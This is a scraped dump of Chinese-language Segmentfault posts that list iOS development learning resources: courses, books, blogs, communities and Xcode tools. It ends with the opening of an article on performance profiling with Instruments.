<p>GitHub 地址: <a rel=""nofollow"" href=""https://github.com/Aufree/trip-to-iOS""></a><a rel=""nofollow"" href=""https://github.com/Aufree/trip-to-iOS"">https://github.com/Aufree/trip-to-iOS</a></p>

<p>如果您有任何意见也可以通过<a rel=""nofollow"" href=""mailto:freedomlijinfa@gmail.com"">邮件</a>或<a rel=""nofollow"" href=""http://weibo.com/jinfali"">微博</a>联系我</p>

<h2>视频教程(英文)</h2>

<table>
<thead><tr>
<th>视频</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""https://itunes.apple.com/us/course/developing-ios-7-apps-for/id733644550"">Developing iOS 7 Apps for iPhone and iPad</a></td>
  <td>斯坦福开放教程之一, 课程主要讲解了一些 iOS 开发工具和 API 以及 iOS SDK 的使用, 属于 iOS 基础视频</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://itunes.apple.com/itunes-u/ipad-iphone-application-development/id473757255"">iPad and iPhone Application Development</a></td>
  <td>该课程的讲师 Paul Hegarty 是斯坦福大学软件工程学教授, 视频内容讲解得深入, 权威, 深受好评</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://itunes.apple.com/itunes-u/advanced-iphone-development/id407243028"">Advanced iPhone Development - Fall 2010</a></td>
  <td>iOS 开发的进阶课程, 开始涉及到 Core Animation, Core Data, OpenGL 等框架的应用</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://developer.apple.com/devcenter/ios/index.action"">iOS Dev Center</a></td>
  <td>苹果官方提供的 iOS 学习视频</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.lynda.com/search?q=ios"">Lynda</a></td>
  <td>Lynda 上面 iOS 和 Objective-C 的学习资料比较多, 从初级到高级的都有, 覆盖面比较广, 无论 iOS 走到哪个层次, 都可以在上面挑到适合自己的课程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://www.codeschool.com/paths/ios"">Code School</a></td>
  <td>CodeSchool 上面的 iOS 不多, 不过质量都不错, 一些课程也挺有趣的</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://www.udemy.com/topic/learn-objective-c"">Udemy</a></td>
  <td>Udemy 帮助初学者规划了视频学习路线, 从新手到高级分的比较详细</td>
</tr>
</tbody>
</table>
<h2>视频教程(中文)</h2>

<table>
<thead><tr>
<th>视频</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://v.163.com/special/opencourse/ios7.html"">iOS 7应用开发</a></td>
  <td>斯坦福白胡子老爷爷的系列视频, 所有视频皆完成翻译, 视频较新, 翻译质量也很高</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://v.163.com/special/opencourse/iphonekaifa.html"">iPhone开发教程2010年冬</a></td>
  <td>全部视频翻译完毕, 较为深入的讲解 iPhone 开发, 视频适合给有一定 Objective-C 基础的人观看</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.imooc.com/learn/173"">使用Swift开发iOS8 App实战</a></td>
  <td>慕课网的视频, 主要讲 Swift 的一些基本使用, 并在讲解的过程中做了几个小 APP, 最后还讲了 Sketch 制作分享按钮</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.imooc.com/learn/218"">征战Objective-C</a></td>
  <td>视频还未完结, 讲了一些 C 和 Objective-C 的基本语法, 适合零基础的人观看</td>
</tr>
</tbody>
</table>
<h2>书籍</h2>

<table>
<thead><tr>
<th>书籍名称</th>
  <th>推荐理由</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.com/dp/032194206X/ref=cm_sw_r_tw_dp_fWrPub0BGRHJ3"">Objective-C Programming</a></td>
  <td>内容不多, 却都是精华, 有了一点 C 语言基础可以快速阅读此书, 大概一天时间就可以看完, 看完后对 iOS 开发能够有个基本的印象</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://book.douban.com/subject/24538384"">iOS Programming</a></td>
  <td>这本书在 Quora 上被评为 iOS 入门最佳书籍, 具体评价可见豆瓣下方该书籍的评论</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://book.douban.com/subject/3688896"">Cocoa Design Patterns</a></td>
  <td>适合打算深入了解 Cocoa 的人看</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://cocoadevcentral.com/d/learn_objectivec"">Learn Objective-C</a></td>
  <td>短小精练, 适合有编程基础的人在半小时内对 Objective-C 有个一定了解</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/ProgrammingWithObjectiveC/Introduction/Introduction.html"">Programming with Objective-C</a></td>
  <td>看完 Learn Obj-C 可以接着看这个官方对 Objective-C 更为深入的介绍</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.cn/dp/B00COG40Y0/ref=cm_sw_r_qz_2_dp_l2OPub0N45R0Q"">Objective-C 基础教程</a></td>
  <td>该书作者 Scott Knaster 是 Mac 开发界的传奇人物, 目前在 Google 出过多数书籍都广受许多程序员好评, 此书适合从初级跳到中级的 iOS 开发者阅读</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.cn/dp/B00R43XG9S/ref=cm_sw_r_qz_pi_T2A_jdp_fCPPub0VBF67T"">iOS 开发进阶</a></td>
  <td>该书作者唐巧是国内 iOS 开发界的名人, 曾参与多个知名软件的开发, 目前该书尚在预售中, 书本内容由浅入深, 将读者一步一步引入到 iOS 中去, 同样适合初级跳到中级的 iOS 开发者阅读</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.com/Programming-Objective-C-Edition-Developers-Library/dp/0321967607"">Programming in Objective-C</a></td>
  <td>这本书在亚马逊上面深受欢迎, 有关 Objective-C 的东西讲得非常详细</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.cn/dp/B00JPVNFKM/ref=cm_sw_r_qz_4_dp_tdPPub14X59PV"">iOS 测试指南</a></td>
  <td>该书作者是豆瓣的员工, 书中写的多数内容都是作者在平时的工作实践当中提炼出来的测试经验, 重点讲述了各个测试阶段的具体实践方法, 并且通过持续集成串联了各个测试阶段的活动。</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://book.douban.com/subject/6920082"">Objective-C编程之道</a></td>
  <td>解析 iOS 的开山之作, 详细介绍了 MVC 在 Cocoa Touch 上的运作过程, 该书适用于 iOS 中级开发者阅读</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.cn/dp/B00DE60G3S/ref=cm_sw_r_qz_2_dp_hdPPub11MFE6G"">Objective-C高级编程</a></td>
  <td>本书主要介绍 iOS 与 OS X 多线程和内存管理, 深入破析了苹果官方公布的源代码, 告诉你一些苹果公司官方文档中不会出现的知识, 适合中级以上 iOS 开发人员阅读</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.cn/dp/B00IDSGY06/ref=cm_sw_r_qz_2_dp_A2OPub0CH96YH"">Effective Objective C 2.0</a></td>
  <td>书里写了编写高质量iOS与OS X代码的52个有效方法, 适合 iOS 开发的进阶使用</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.amazon.com/dp/0990402053/ref=cm_sw_r_tw_dp_louPub127Q1YP"">Swift Fundamentals</a></td>
  <td>估计将来这本书会成为 Swift 的经典入门书籍, 它的 Stars 数说明了一切</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://numbbbbb.gitbooks.io/-the-swift-programming-language-/content"">The Swift Programming Language 中文版</a></td>
  <td>90 后开发者梁杰组织翻译的 Swift 编程语言中文版</td>
</tr>
</tbody>
</table>
<h2>博客</h2>

<table>
<thead><tr>
<th>博客地址</th>
  <th>博主信息</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://onevcat.com/#blog"">OneV's Den</a></td>
  <td>王巍(喵神), 现居日本, 就职于 LINE, 知名 iOS 开发者, 写的文章大多深入浅出, 内容广泛, 目前在维护的 <a rel=""nofollow"" href=""http://swifter.tips"">Swifter</a> 也值得收藏</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://blog.devtang.com"">唐巧的技术博客</a></td>
  <td>唐巧, 国内知名 iOS 开发者, 现就职于猿题库, 博客推出的 iOS 移动开发周报很受欢迎, 更新频繁</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://blog.txx.im"">txx's blog</a></td>
  <td>90 后 iOS 开发者, 人称虾神, 文章内容讲解大多浅白易懂, 很值得看</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://beyondvincent.com"">破船之家</a></td>
  <td>博主也是 iOS 大神一个, 经常更新一些 iOS 教程, 文章的质量都很高, 非常值得看</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://nshipster.cn"">NSHipster</a></td>
  <td>NSHipster 的中文网站, 主要对 NSHipster 的英文网站进行翻译, 博文出自 Mattt 大神之手, 文章大都写得很深入, 详细, 每周一更</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://blog.leezhong.com"">Limboy 无网不剩</a></td>
  <td>李忠, 知乎前员工, 目前在负责花瓣 iOS 开发, 不少文章里面有介绍博主个人的学习方法, 让读者在学到技术的同时也掌握学习的技巧</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://nianxi.net"">念茜的博客</a></td>
  <td>iOS 圈的女神人物, 写的关于安全问题的文章都值得一看, 由于新博客刚开通不久, 目前文章较少, 可以去看下她以前的<a rel=""nofollow"" href=""http://blog.csdn.net/yiyaaixuexi"">博客</a>
</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://weekly.ios-wiki.com/history"">iOS技术周报</a></td>
  <td>吴发伟, 天猫资深软件开发工程师, iOS 技术周报每周一更, 推送一些 iOS 技巧, 代码库, 设计等资讯.</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.iwangke.me"">iWangKe.me</a></td>
  <td>王轲, IndieBros Studio 创始人, 优秀的 iOS 开发工程师, 写的文章深入浅出, 很多问题分析透彻, 非常有条理性</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.jianshu.com/p/99e8b3f6f377"">叶孤城</a></td>
  <td>叶孤城, 优秀 iOS 开发工程师, 发表的文章都有很多干货, 对源码解析类文章写得浅显易懂, 并时常总结一些 iOS 开发技巧, 值得一读</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://zhowkev.in"">Kevin Blog</a></td>
  <td>周楷雯, 秒视创始人, 知名 iOS 工程师, 做出了 <a rel=""nofollow"" href=""https://github.com/kevinzhow/PNChart"">PNChart</a>和 <a rel=""nofollow"" href=""https://github.com/kevinzhow/Waver"">Waver</a> 这样的好项目, 在博客中也有谈到具体的实现过程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://imtx.me"">IMTX</a></td>
  <td>图拉鼎, 知名 Apple 平台开发者, 曾经的 Ubuntu 平台开发者, 文章有不少干货, 大多讲解技术实现和学习经验</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/tangqiaoboy/iOSBlogCN"">更多</a></td>
  <td>唐巧收集的中文 iOS/Mac 开发博客列表, 更新频繁, 值得收藏</td>
</tr>
</tbody>
</table>
<h2>文章</h2>

<table>
<thead><tr>
<th>标题</th>
  <th>内容简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""https://www.udemy.com/blog/learn-objective-c"">Learn Objective C: The Path to iPhone Development</a></td>
  <td>Udemy 写的文章, 说明了一些学习 Objective-C 的前提条件, Objective-C 的发展历史, 学习方法以及学习资源</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://lifehacker.com/i-want-to-write-ios-apps-where-do-i-start-1644802175"">I Want to Write iOS Apps. Where Do I Start?</a></td>
  <td>主要对 iOS 的开发环境进行了介绍, 并且涉及到了 Swift 的学习, iOS 上架的注意事项, iOS 的设计, 测试, 代码托管等, 讲解较为广泛, 同时也给出不少学习资源</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://roadfiresoftware.com/2014/04/how-to-become-a-professional-ios-developer"">How to become a professional iOS developer</a></td>
  <td>文章写的很有条理, 文中多次强调了版本控制系统的重要性, 主要内容是对学习 iOS 开发到就职, 给出了自己的建议</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://codewithchris.com/learning-ios-programming"">Learning iOS Programming</a></td>
  <td>作者总结了一些自己学习 iOS 的血的教训, 最后给出了一些不错学习建议</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://www.udacity.com/career-paths/ios-developer"">Become an iOS Developer</a></td>
  <td>作者列举了一些学习 iOS 的方法以及常用的库, 以及自学 iOS 的一些建议</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.devtang.com/blog/2014/07/27/ios-levelup-tips"">iOS开发如何提高</a></td>
  <td>唐巧写的一篇文章, 主要是对 iOS 技术的提高做的一个总结, 文中不少资源, 工具, 学习方法</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://limboy.me/ios/2014/12/31/learning-ios.html"">自学 iOS 开发的一些经验</a></td>
  <td>文章从入门到进阶到高级, 分为三个阶段, 有条理的讲出了 iOS 的整个学习过程中开发者可能遇到的问题, 并给出了解决办法, 奉献了不少好工具, 资源还有珍贵的学习经验</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://readful.com/post/101914515826/0-ios"">如何从 0 开始学 iOS 开发</a></td>
  <td>作者给出了学习 iOS 的流程, 并给出一些不错的学习资源</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.cocoachina.com/programmer/20141128/10353.html"">如果我可以重新学习iOS开发</a></td>
  <td>作者在文中给出了学习的一些建议, 也谈到了自己的学习方法</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.cocoachina.com/ios/20141106/10147.html"">iOS开发学习路径的一些建议</a></td>
  <td>文中谈到了英语的重要性, 以及写博客, 看源代码的好处</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.jianshu.com/p/KSuDqb"">iOS 开发入门</a></td>
  <td>作者分享了自己学习 iOS 的经验和资源</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://beyondvincent.com/blog/2013/07/18/106"">Mac 和 iOS 开发资源汇总</a></td>
  <td>破船之家发布的资源汇总</td>
</tr>
</tbody>
</table>
<h2>相关网站</h2>

<table>
<thead><tr>
<th>网站</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://tutsplus.com/tutorials/search?utf8=%E2%9C%93&amp;search%5Btopic%5D=&amp;search%5Bterms%5D=ios&amp;button="">tutsplus</a></td>
  <td>不定时更新一些 iOS 教程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://developer.apple.com/videos"">WWDC</a></td>
  <td>苹果官方每年一度的 WWDC 视频, 可以了解历年有关 iOS 发布的内容</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://asciiwwdc.com"">ASCIIwwdc</a></td>
  <td>WWDC 的文字版</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://swift.zeef.com/robin.eggenkamp"">Awesome Swift</a></td>
  <td>该网站收集了很多关于 Swift 的学习资料, 新闻</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.appcoda.com"">Appcoda</a></td>
  <td>经常发布一些 iOS 编程教程, 更新比较频繁, 想了解更多可以查看该网站的 About 界面</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://nshipster.com"">NSHipster</a></td>
  <td>NSHipster is a journal of the overlooked bits in Objective-C, Swift, and Cocoa. Updated weekly.</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.thinkandbuild.it"">Think and Build</a></td>
  <td>Some tutorials about Core Graphic and Core Animation.</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.raywenderlich.com/tutorials"">Tutorials</a></td>
  <td>大把的 Objective-C, Swift, iOS 教程, 且全部免费, Raywenderlich 真是业界良心, 赞!</td>
</tr>
</tbody>
</table>
<h2>社区</h2>

<table>
<thead><tr>
<th>社区</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://www.cocoachina.com"">CocoaChina</a></td>
  <td>全球最大苹果开发者中文社区</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://code4app.com"">code4app</a></td>
  <td>经常更新一些很不错的 iOS 代码片段和一些 iOS 资源</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.objc.io"">objc</a></td>
  <td>定期发布一些有关 Objective-C 的高质量的文章</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://objccn.io"">objc中国</a></td>
  <td>喵神组织的对 objc.io 的翻译网站, 旨在推进国内技术圈整体水平, 翻译质量非常高</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.devdiv.com"">DevDiv</a></td>
  <td>发布一些 iOS 的最新资讯及教程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://discuss.cocos2d-x.org"">Cocos2d-x</a></td>
  <td>Cocos2d-x 论坛</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://iphonedevsdk.com"">iPhone Dev SDK</a></td>
  <td>国外较有名的 iOS 开发者论坛</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://forum.learncocoa.org"">Learn Cocoa and iOS Development Forum</a></td>
  <td>
<a rel=""nofollow"" href=""http://www.amazon.com/Learn-Cocoa-Mac-Jack-Nutting/dp/1430245425"">Learn Cocoa on the Mac</a> 和 <a rel=""nofollow"" href=""http://www.amazon.com/Beginning-iOS-Development-Exploring-SDK/dp/143026022X"">Beginning iOS 7 Development</a> 这两本书籍的官方论坛, 用户活跃度较高</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://devforums.apple.com"">Apple Developer Forums</a></td>
  <td>苹果官方的开发者论坛</td>
</tr>
</tbody>
</table>
<h2>工具/插件</h2>

<table>
<thead><tr>
<th>工具/插件</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://cocoapods.org"">CocoaPods</a></td>
  <td>开发 OS X 和 iOS 应用程序的一个第三方库的依赖管理工具, 本身是 Ruby 的一个 gem, 极大的简化了 Objective-C 的开发流程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://alcatraz.io"">Alcatraz</a></td>
  <td>Alcatraz 是一款管理 Xcode 插件、模版以及颜色配置的工具</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/robbiehanson/XcodeColors"">XcodeColors</a></td>
  <td>使 Xcode 调试控制台色彩更丰富</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/facebook/xctool"">xctool</a></td>
  <td>Facebook 开源的一个 iOS 编译和测试的工具</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/trawor/XToDo"">XToDo</a></td>
  <td>一款注释辅助插件，主要用于收集并列出项目中的<code>TODO</code>, <code>FIXME</code>, <code>???</code>, <code>!!!</code>
</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/ksuther/KSImageNamed-Xcode"">KSImageNamed-Xcode</a></td>
  <td>自动补全图片命名的一款插件</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/onevcat/VVDocumenter-Xcode"">VVDocumenter</a></td>
  <td>一个自动生成代码注释的工具</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://imageoptim.com"">ImageOptim</a></td>
  <td>用于压缩图片一款工具</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://benscheirman.com/2013/08/the-ios-developers-toolbelt"">iOS 必备的 75 个工具</a></td>
  <td>其中包含了非常多好用的工具, 涉及到设计, 分析, 部署等, 总结的十分详细, 有<a rel=""nofollow"" href=""http://blog.jobbole.com/46799"">中文翻译</a>
</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://blog.devtang.com/blog/2014/06/29/ios-dev-tools"">更多</a></td>
  <td>唐巧总结的一些图形应用工具, 命令行工具, Xcode 插件, 并介绍了一点基础的用法</td>
</tr>
</tbody>
</table>

                ", iOS 学习资料整理（上）,1531972134,161,1,353,1,1,https://segmentfault.com/a/1190000002573634
163,1,0,6,"
                    
<h2>编程语言</h2>

<p><a rel=""nofollow"" href=""http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/ProgrammingWithObjectiveC/Introduction/Introduction.html"">Programming with Objective-C: About Objective-C</a> ： Apple 撰写的一份关于 Objective-C 2.0 的一份文档，这也算是学习 iOS/Mac 开发必读的一份文档，记得我当初看的时候是叫做 The Objective-C Programming Language。</p>

<p><a rel=""nofollow"" href=""http://cocoadevcentral.com/d/learn_objectivec/"">Learn Objective-C</a> ：这也是广受推荐的一份文档，短小精练，适合入门。</p>

<p><a rel=""nofollow"" href=""http://www.amazon.com/Programming-Objective-C-Edition-Developers-Library/dp/0321811909"">Programming in Objective-C 2.0</a> 原书已经出到第四版了，建议阅读原版，中文版是根据第二版翻译的。此书比较适合入门，它甚至涵盖了 C 语言一些知识。而不像《Objective-C基础教程》直接就进入 Objective-C 及面向对象的一些思想。</p>

<p><a rel=""nofollow"" href=""http://book.douban.com/subject/19962787/"">Objective-C编程</a>（英文名：Objective-C Programming: The Big Nerd Ranch Guide）：有中文的，翻一翻，照着书，把代码在 Xcode 上敲一遍，编译下看看结果，也可以对代码做些修改，看会不会报错，看会不会得到不同的结果，其实编程就是这样学的，慢慢地就入门了。看完这本书，对 Objective-C 的语法有个大概的了解即可。另外此书的英文版已经出到第 2 版了，如果英语能力不错的，推荐看第 2 版，请点击<a rel=""nofollow"" href=""http://www.bignerdranch.com/we-write/objective-c-programming/"">这里</a>。</p>

<h2>iOS 开发</h2>

<p><a rel=""nofollow"" href=""https://developer.apple.com/library/ios/#referencelibrary/GettingStarted/RoadMapiOSCh/index.html#//apple_ref/doc/uid/TP40012668"">马上着手开发 iOS 应用程序</a>：苹果官方入门资料，也有的<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/#referencelibrary/GettingStarted/RoadMapiOS/index.html"">英文版</a>。这个教程是教你写一个 TodoList 的 app，无需其它准备工作，你可以直接开始，照着教程一步一步做，不需要理解每一步到底是为什么，这是为了让你对 iOS 开发有个大概的认识，也可以让你快速建立对 iOS 开发的兴趣和信心。</p>

<p><a rel=""nofollow"" href=""https://developer.apple.com/library/ios/navigation/"">iOS Developer Library</a>：官方的文档库，也是最靠谱的资料了，在 Xcode 中也可以下载后直接查阅。</p>

<p><a rel=""nofollow"" href=""http://www.amazon.com/Beginning-iOS-Development-Exploring-SDK/dp/1430245123"">Beginning iOS 6 Development: Exploring the iOS SDK</a> ：这个书算是用得比较多的一本了，当初我也是看着这本边学边做。且作者也比较勤快，基本跟随 iOS 更新的步伐，每年修订。当时我看的是 iOS 5 的版本，也建议任何学习资料要看要 iOS 5 以后版本的，因为其引入了 ARC，在内存管理方面和以前的方式有很大的不同。</p>

<p><a rel=""nofollow"" href=""http://www.amazon.com/iOS-Programming-Ranch-Guide-Guides/dp/0321821521"">iOS Programming: The Big Nerd Ranch Guide</a>：如果你想对 iOS 开发有个深入、系统地了解，可以看看这本书。比起上面那本这本涉及的面会稍微广些，建议辅助用。</p>

<p><a rel=""nofollow"" href=""http://www.raywenderlich.com/store/ios-apprentice"">Ray Wenderlich 的「The iOS Apprentice」教程</a>：目前最新版是第 3 版，质量上乘，包含 Objective-C 和 Swift 的教程，手把手教你写 4 个 app。</p>

<h2>视频教程</h2>

<p><a rel=""nofollow"" href=""http://open.163.com/special/opencourse/ios7.html"">斯坦福大学公开课：iOS 7应用开发</a>：适用于iOS7。本课程介绍了使用Xcode5建造iPhone平台上的应用程序所需的工具和应用程序接口；使用多点触控技术，为手机等终端设计用户互交界面等技术进行面向对象的设计。其他主题包括：内核动画、bonjour网络、移动终端电量管理和性能测评。此外 iTunes 上的英文原版见<a rel=""nofollow"" href=""https://itunes.apple.com/us/course/developing-ios-7-apps-for/id733644550"">这里</a>。</p>

<p><a rel=""nofollow"" href=""http://bitfountain.io/courses/the-complete-ios-7-course-learn-by-building-14-apps"">The Complete iOS 7 Course - Learn by Building 14 Apps</a>：很不错的课程，本来是收费的教程，貌似在用 Swift 重写，所以把 oc 的这套免费了。</p>

<p><a rel=""nofollow"" href=""https://designcode.io/"">Design+Code: Learn iOS design and Xcode</a>：这套教程的价格目前是 $50，非常超值，而且还可以得到一个 Sketch 的 8 折优惠码，一个 Ember 的 7 折优惠码。这套教程的好处在于，你不仅学会了用 Objective-C 开发一个 app，同时还学会了用 Sketch 设计一个 app，里面还包含了 Swift 的教程。</p>

<h2>开源项目</h2>

<p>Github 优秀开源项目收集：<a rel=""nofollow"" href=""http://github.ibireme.com/github/list/ios/"">http://github.ibireme.com/github/list/ios/</a><br>
code4app 上的代码资源：<a rel=""nofollow"" href=""http://code4app.com/resource"">http://code4app.com/resource</a></p>

<h2>优秀博客</h2>

<p>objc中国：<a rel=""nofollow"" href=""http://objccn.io/"">http://objccn.io/</a><br>
大猫的意淫笔记：<a rel=""nofollow"" href=""http://bigc.at/"">http://bigc.at/</a><br>
M了个J：<a rel=""nofollow"" href=""http://www.cnblogs.com/mjios"">http://www.cnblogs.com/mjios</a><br>
唐巧技术博客—— ios开发、java开发等：<a rel=""nofollow"" href=""http://blog.devtang.com"">http://blog.devtang.com</a><br>
董宝君的iOS技术博客：<a rel=""nofollow"" href=""http://blog.devdong.com/"">http://blog.devdong.com/</a><br>
图拉鼎的博客：<a rel=""nofollow"" href=""http://imtx.me/"">http://imtx.me/</a><br>
ygm900：<a rel=""nofollow"" href=""http://www.cnblogs.com/ygm900/"">http://www.cnblogs.com/ygm900/</a><br>
雨中泪雪人的博客：<a rel=""nofollow"" href=""http://blog.sina.com.cn/yzykhq"">http://blog.sina.com.cn/yzykhq</a><br>
EntLib.net 技术分享平台：<a rel=""nofollow"" href=""http://www.entlib.net/?cat=95"">http://www.entlib.net/?cat=95</a><br>
Yaski的iPhone博客：<a rel=""nofollow"" href=""http://www.cnblogs.com/yaski/"">http://www.cnblogs.com/yaski/</a><br>
AppCoda - Learn iOS Programming and Build iPhone App：<a rel=""nofollow"" href=""http://www.appcoda.com/"">http://www.appcoda.com/</a><br>
梦维：<a rel=""nofollow"" href=""http://www.dreamingwish.com/"">http://www.dreamingwish.com/</a><br>
RannieR的技术博客：<a rel=""nofollow"" href=""http://blog.csdn.net/ran0809/article/category/1569165"">http://blog.csdn.net/ran0809/article/category/1569165</a><br>
丸子的iOS开发经验：<a rel=""nofollow"" href=""http://iaiai.iteye.com/category/202253"">http://iaiai.iteye.com/category/202253</a><br>
邓映山的博客：<a rel=""nofollow"" href=""http://www.objcer.com/"">http://www.objcer.com/</a><br>
王德康的空间：<a rel=""nofollow"" href=""http://my.oschina.net/wangdk/blog?catalog=375448"">http://my.oschina.net/wangdk/blog?catalog=375448</a><br>
唐韧 Ryan's zone In Android &amp; iOS：<a rel=""nofollow"" href=""http://blog.csdn.net/tangren03/article/category/1073221"">http://blog.csdn.net/tangren03/article/category/1073221</a><br>
MAGICALBOY：<a rel=""nofollow"" href=""http://magicalboy.com/"">http://magicalboy.com/</a><br>
菜鸟学iOS的笔记 - 新风作浪的博客专栏：<a rel=""nofollow"" href=""http://blog.csdn.net/duxinfeng2010/article/category/1155790"">http://blog.csdn.net/duxinfeng2010/article/category/1155790</a><br>
阿福的专栏：<a rel=""nofollow"" href=""http://blog.csdn.net/lizhongfu2013"">http://blog.csdn.net/lizhongfu2013</a><br>
iOS-Coding的博客：<a rel=""nofollow"" href=""http://blog.sina.com.cn/p709723778"">http://blog.sina.com.cn/p709723778</a><br>
破船之家：<a rel=""nofollow"" href=""http://beyondvincent.com/"">http://beyondvincent.com/</a><br>
iOS分享网——分享iOS开发学习资料（视频电子书文章源码）：<a rel=""nofollow"" href=""http://iosshare.cn/"">http://iosshare.cn/</a><br>
songrotek的专栏：<a rel=""nofollow"" href=""http://blog.csdn.net/songrotek"">http://blog.csdn.net/songrotek</a><br>
容芳志专栏：<a rel=""nofollow"" href=""http://blog.csdn.net/totogo2010"">http://blog.csdn.net/totogo2010</a><br>
fengsh998的专栏：<a rel=""nofollow"" href=""http://blog.csdn.net/fengsh998/article/category/1222508"">http://blog.csdn.net/fengsh998/article/category/1222508</a></p>

<h2>参考来源</h2>

<ol>
<li><a rel=""nofollow"" href=""http://www.jianshu.com/p/KSuDqb"">http://www.jianshu.com/p/KSuDqb</a></li>
<li><a rel=""nofollow"" href=""http://readful.com/post/101914515826/0-ios"">http://readful.com/post/101914515826/0-ios</a></li>
<li><a rel=""nofollow"" href=""http://ruziniu0510.blog.163.com/blog/static/86050179201393045738887/"">http://ruziniu0510.blog.163.com/blog/static/86050179201393045738887/</a></li>
</ol>

                ", iOS 学习参考资料,1531972135,401,1,753,1,1,https://segmentfault.com/a/1190000002573302
164,1,0,6,"
                    
<blockquote>
  <p>你的 iOS 应用，运行速度靠谱吗？中枪的同学莫要愁，性能优化咱有妙招。用 Xcode 自家的调试工具 Instruments，揪出那些堵线程、占内存、耗资源的问题代码，彻底破掉迷局，让应用扬眉吐气！</p>
</blockquote>

<hr>
<p>对于每位 iOS 开发者来说，代码性能是个避不开的话题。随着项目的扩大和功能的增多，没经过认真调试和优化的代码，要么任性地卡顿运行，要么低调地崩溃了之……结果呢，大家用着不高兴，开发者也不开心。</p>

<p>其实要破这个局面并不难，只要在 Xcode 自带的监控调试工具 Instruments 上花点功夫，让大代码流畅运行也不是神话。Instruments 提供了很多功能，我会重点介绍一下我最常用的三大类：</p>

<ul>
<li>Time Profiler：分析代码的执行时间，找出导致程序变慢的原因。</li>
<li>Allocations：监测内存使用/分配情况<br>
